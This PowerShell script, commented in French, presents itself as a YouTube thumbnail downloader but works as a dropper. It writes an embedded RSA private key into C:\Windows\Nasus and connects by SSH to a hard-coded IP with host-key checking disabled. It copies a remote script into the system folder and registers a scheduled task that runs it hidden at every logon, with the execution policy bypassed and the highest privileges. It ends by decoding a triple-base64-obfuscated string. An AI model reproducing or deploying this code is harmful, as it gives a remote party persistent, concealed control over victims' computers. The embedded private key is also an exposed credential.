
<#
dérouler du procédé:
    >>> get miniature
    >>> crée tache qui va chercher le script sur le serveur et celui-ci va dans C:\Windows\Nasus\MainScript.ps1
#>

########################################################################################################

Function Miniature 
{
    $VIDEO_ID = (Read-Host("Url De La Video")).Substring(32)
    $videoUrl = "https://i.ytimg.com/vi/$VIDEO_ID"

    try 
    {
        $thumbnailUrl = $videoUrl + "/maxresdefault.jpg"
        $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
    }
    catch 
    {
        try 
        {
            $thumbnailUrl = $videoUrl + "/sddefault.jpg"
            $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
        }
        catch 
        {
            try 
            {
                $thumbnailUrl = $videoUrl + "/hqdefault.jpg"
                $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
            }
            catch 
            {
                try 
                {
                    $thumbnailUrl = $videoUrl + "/mqdefault.jpg"
                    $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
                }
                catch 
                {
                    Write-Output ("$_")
                }
            }
        }
    }

    $jours = Get-Date -UFormat "%d-%m"
    $heure = Get-Date -UFormat "%HH%M-%Ss"
    $thumbnailPath = "$env:USERPROFILE\Desktop\Images\$jours\$heure.jpg"
    New-Item -Path $thumbnailPath -ItemType File -Force -InformationAction SilentlyContinue
    $response.Content | Set-Content $thumbnailPath -Encoding Byte -Force
}

Function configCleLog
{
    $cle = '-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAo+4q2KPZWettaBUWvkHI6PTcL7bA74TQrJ3pG/bmRs68KxEU
7RgB6/YSZ2XYlidCM7adphEMg7/kRjH6mBckeoIOq+X7qimAWgGgeV8pdvJFV4Gy
URtHhIE2qDAjUZP7M0R65N/d7W8YqFhvUJ3mp6wThAcboYdbo3A8cvOG0OzVuv0z
2s1+BLhAdGGWBnlD9M4H1Wcd9A11hAQMZ9AfMKsJmFN/2wYy+Fh4x9PHhKH+L6En
x5GvkLJFKOF4qhExJnDm5QjN7xexaAjt2popMuLEeZCe0iDj/n7h6xZxGaIlwGte
iGJu6Nss0B9aIk6P8LAsFuObnFWRM7UXXB3olQIDAQABAoIBAHVaVonoIfzhMN1F
25Yv+efrAoWVyuCsr8Yi9XHzej5OWR5riBODED0fV2V132r+h8IFhS4RHmhiwsQN
m1utlYut91rPtS3Hr/6/E2ZP3ZstLL7MNh8h7DzLU5lrfJ011qqI54FZUcJbuccq
J+YKY8i8wuvNOtaT0+JYwq138Jc3CZmKpDoyHETEXSy8MH3PUfcB0QcngEFs0Vk+
mcC24SpNPramvM6gCD2AS9WU2x5+bopk12p5IXnaKUSNOEZXORl9jbUr4Ma7iJrO
RayhBog9Kwl89+mwkgN8UiMHkIJu0Dj05x+h3K67Dl5FLF63aEo5Sd8x3iUtoeJo
Ma6zxbECgYEA+N7h8nCg9kvmyl5H61S4hnhUkkV0ZwhgRvD2Ww0W9eAZVH8Szt+l
A6gcQa0ctpG453aX38NcB1oonCxJmRHEms+EEdJA9NaOeL2acpEIdjo4G3WcqZ9V
D7OmPxp6D7C43SM3Eu0V96xMos+Eyn3V0eaVwfiiSIG6uPJ5nRGg1p8CgYEAqKBd
4aL5kwMiE6pyHzEhwlGnDda0tZshvaJanSs51rIpuL6DWgTN0fndqBxC0NlHLRGA
Wvy4X+4ZMbwxOFfC/2g9nZkXOC20rlcPuzNba/xKm1wLLFxUM4UcDGRX6gJlqCuu
CquvUKqVlTxSpqt1DyMKviWGVPbgY2Wa947L+EsCgYAi+1FPPr2hYTHjqDT7w0Dc
xfU9Sj3+bZL65cv7KG/dx85HrkT6hz0usmamZKrwjrMq9eSLM26wKeAjc6Y0ueak
zB6IUsGGqNIF7sDS8cf6tlxEn9eRkC/osRvhKtuVcQXLL7QCGQlJcxKioADOZbm0
c3EBfu1wu6t/a7XkeiHdiQKBgH6C+ox7qoUql5lrin1ubiaM/il6yU9rGTBeK1+5
e4ZhWr35aTDTY9vCfBNRSKvKKAVfGQ6qhmWqjAptZ/wek/TtLzUbE3mZiPI37VyE
lnV47jyLHPLmPmH83uNJMVAnBj/arZPh5QE/SkSR4mybPJLjtn6cRqFeK1FHfLF4
1/zrAoGAGNRKGYBlCG4FmyIbAFKigtcLWzYvgXSmGf3uqOqHCreYEJ4ENLe1v2Xv
2BQnXoH6btgM93zkrhwuCV6A6e5p3p8TmGBLgfsp41/ICLGKBvLJo2VdSzgZOjs0
yBesoIbS3waWJ5e6h5C6tKi+KXixCugjmVnS1OYO3u1FxrPl/5o=
-----END RSA PRIVATE KEY-----'

    $pathCle = Test-Path -Path "$env:SystemRoot\Nasus\cle.pem"
    if(!$pathCle)
    {
        Write-Host("Creation de la cle car inexistante") -ForegroundColor DarkMagenta
        New-Item -ItemType Directory -Path $env:SystemRoot -Name "Nasus" -Force -InformationAction SilentlyContinue
        New-Item -ItemType File -Path $env:SystemRoot\Nasus -Name "cle.pem" -Value $cle -Force -InformationAction SilentlyContinue

        $directory = "C:\Users\gunsa\Desktop\id_rsa"
        $acl = Get-Acl $directory
        $acl.SetAccessRuleProtection($true,$false)
        #Droit Lecture Uniquement sur Administrateurs
        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("gunsa","Read","Allow")
        $acl.SetAccessRule($AccessRule)
        $acl |Set-Acl
    } 
   
    #Pas de confirmation à la connexion
    ssh -o "StrictHostKeyChecking no" 13.39.106.145
}

Function getScriptOnServer
{
    scp -i "$env:SystemRoot/Nasus/cle.pem" admin@13.39.106.145:\home\admin\script\script.ps1 C:\Windows\Nasus\MainScript.ps1
    if(Test-Path -Path "C:\Windows\Nasus\MainScript.ps1"){Write-Host("Script Serveur Bien transfere") -ForegroundColor DarkMagenta}
}
###########################################||Tache pour executer script venant du serveur||#################################################################

function task
{
    if (!(Get-ScheduledTask -TaskName cc -ErrorAction SilentlyContinue))
    {
        Write-Host("Creation de la tache car inexistante") -ForegroundColor DarkMagenta
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-ExecutionPolicy bypass -WindowStyle Hidden -File $env:SystemRoot\Nasus\MainScript.ps1")
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Compatibility Win8 -ExecutionTimeLimit (New-TimeSpan -Days 90)
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal
        Register-ScheduledTask "cc" -InputObject $task -Force -InformationAction SilentlyContinue
        
    }
    Start-ScheduledTask -TaskName "cc"
}

Miniature
configCleLog
getScriptOnServer
task


$C = "WXpOT2IwbEhaREZpYms1b1VVUnJkMHhxUlhkUFV6UjVUWHByZFUxNlRXZE1Wa2xuVG1wWk1rNXFjSE5pTWs1b1lrZG9kbU16VVRaTmFrazk="

$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
$C

<#
for ($i = 0; $i -lt 3; $i++)
{
    $C = 
}
$C
#>